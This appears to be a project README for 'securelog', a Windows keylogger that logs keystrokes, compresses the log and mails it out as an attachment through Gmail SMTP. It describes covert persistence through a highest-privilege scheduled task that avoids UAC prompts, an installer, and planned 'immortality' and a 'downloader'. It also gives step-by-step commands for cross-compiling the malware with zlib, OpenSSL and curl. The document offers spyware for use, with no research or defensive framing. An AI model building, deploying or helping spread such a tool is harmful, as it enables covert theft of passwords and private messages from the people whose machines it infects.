# Keylog & Gmail

## About this thing

This is a lazy implementation for a keylogger that sends keylogs through gmail smtp under Windows. :smile:

## Features

* Logs keys and makes notes about special keys and stores them in a file.
* Downloads Mozilla's certificates bundle made by the [curl team](http://curl.haxx.se/ca/cacert.pem) to use it for secure connexion to Gmail SMTP.
* Requires administrator if not.
* Upon a scheduled task sends keylog file as compressed attachement.
* Autoruns on startup with a scheduled task with highest privileges.
* Handy NSIS Installer (we will make our scheduled tasks from there).

> Setting a scheduled task running with highest privileges will prevent triggering the alert from the UAC

> The log is mailed as attachment that is compressed with zlib (file: `securelog.xxx`); to decompress it you'll need to compile [zpipe](http://zlib.net/zpipe.c) that is included in the zlib's examples folder. Usage of zpipe is quite simple:
> ```bash
> ./zpipe -d < securelog.xxx > securelog.txt
> ```

## TODO

* Implement error checking.. (Yeah, first thing to do when I'll have time! :stuck_out_tongue_winking_eye:)
* Fix many many bugs.. (Characters check, uninstaller while program's running..)
* Implement tweaks & new features.. (Strip the size, immortality, downloader..)
* Add compile instructions for Windows users.. :smile:

## Compiling this thing

### Fetch program's source with curl, zlib and OpenSSL sources as submodules:

```bash
git clone https://github.com/pr-nizar/securelog --recurse-submodules
```

> Or if you don't want to get submodules immediately you can `git clone https://github.com/pr-nizar/securelog` the main repository then `git submodule update --init --recursive` to get the heavy submodules.

### Cross-compiling under Ubuntu

#### Dependencies

```bash
sudo apt-get install mingw32 nsis
```

Oh yeah and compiling our librairies one by one on this order:

> I'm cross compiling zlib, openssl and curl with i586-mingw32msvc-gcc. :wink:

#### zlib (v1.2.8)

```bash
cd zlib
# Clean up if you already builded it:
# rm -rf build && make -f win32/Makefile.gcc clean
# Don't do the below command 2 times:
sed -e s/"PREFIX ="/"PREFIX = i586-mingw32msvc-"/ -i win32/Makefile.gcc
make -f win32/Makefile.gcc
make -f win32/Makefile.gcc install INCLUDE_PATH=build/include LIBRARY_PATH=build/lib BINARY_PATH=buil/bin
cd ..
```

#### OpenSSL (OpenSSL_1_0_1p)

```bash
cd openssl
# Clean up if you already builded it:
# rm -rf build && PATH=$PATH:/usr/i586-mingw32msvc/bin make clean && \
# PATH=$PATH:/usr/i586-mingw32msvc/bin make dclean
CROSS_COMPILE="i586-mingw32msvc-" ./Configure mingw --prefix=$(pwd)/build \
--openssldir=$(pwd)/build --with-zlib-lib=$(pwd)/../zlib/build/lib \
--with-zlib-include=$(pwd)/../zlib/build/include no-384 no-AES-256 no-AES256 \
no-CAMELLIA128 no-CAMELLIA256 no-DHE no-DSS no-ECDH no-ECDSA no-EDE no-EDH \
no-PSK no-bf no-camellia no-dso no-ec no-dtls no-ec2m no-engines no-err no-gmp \
no-gost no-heartbeats no-hw no-idea no-krb5 no-md2 no-mdc2 no-npn no-rc2 no-rc5 \
no-rfc3779 no-ripemd no-sctp no-store no-shared no-sse2 no-threads no-unit-test \
no-x no-x509v disable-capieng -DOPENSSL_USE_IPV6=0 enable-ECDHE enable-RSA \
enable-AES128 enable-GCM enable-SHA256
PATH=$PATH:/usr/i586-mingw32msvc/bin make depend
PATH=$PATH:/usr/i586-mingw32msvc/bin make
PATH=$PATH:/usr/i586-mingw32msvc/bin make install
cd ..
```

> Too much shit in libssl and libcrypto: too heavy.. Stripping it to the least.. :disappointed_relieved:

#### Curl (curl-7_44_0)

```bash
cd curl
# Clean up if you already builded it:
# rm -rf build && make clean && make distclean
./buildconf
./configure --host=i586-mingw32msvc LDFLAGS=-mwindows --prefix=$(pwd)/build \
--with-zlib=$(pwd)/../zlib/build --with-ssl=$(pwd)/../openssl/build \
--enable-static --disable-shared --enable-http --enable-smtp --enable-crypto-auth \
--disable-threaded-resolver --disable-cookies --disable-ares --disable-ipv6 \
--disable-manual --disable-proxy --disable-verbose --without-random --without-libidn \
--without-librtmp --disable-ldap --disable-ldaps --disable-dict --disable-ftp \
--disable-file --disable-rtsp  --disable-telnet --disable-tftp --disable-pop3 \
--disable-imap --disable-smb --disable-gopher --without-ca-bundle --without-ca-path
make
make install
cd ..
```

> Keeping it simple disabling every single protocol or feature that libcurl have except those for HTTP and SMTP with TLS; cause size matters..

#### The main program

We have to compile our resource file:

```bash
i586-mingw32msvc-windres securelog.rc securelog.o
```

Then the main thing:

```bash
i586-mingw32msvc-gcc -O3 -Os -s -Wno-system-headers -mwindows -DCURL_STATICLIB \
-I$(pwd)/zlib/build/include -I$(pwd)/openssl/build/include \
-I$(pwd)/curl/build/include -o securelog.exe securelog.c securelog.o -L$(pwd)/zlib/build/lib \
-L$(pwd)/openssl/build/lib -L$(pwd)/curl/build/lib $(pwd)/curl/build/lib/libcurl.a \
$(pwd)/zlib/build/lib/libz.a $(pwd)/openssl/build/lib/libssl.a \
$(pwd)/openssl/build/lib/libcrypto.a -lgdi32 -lssl -lcrypto -lcurl -lz -lws2_32
```

> I know this is strange but that's the only way I got it to compile! :cry:

#### The windows installer

```bash
makensis securelog.nsi
```

### Compiling under Windows :scream:

I don't have Windows sorry! It shouldn't be that hard anyway.. Why don't you get yourself [a decent Linux distro](http://xubuntu.org/) in the meanwhile?!

> Just kidding! :stuck_out_tongue_winking_eye:
> (TODO :stuck_out_tongue:)

## LICENSE

Still thinking about it... :trollface: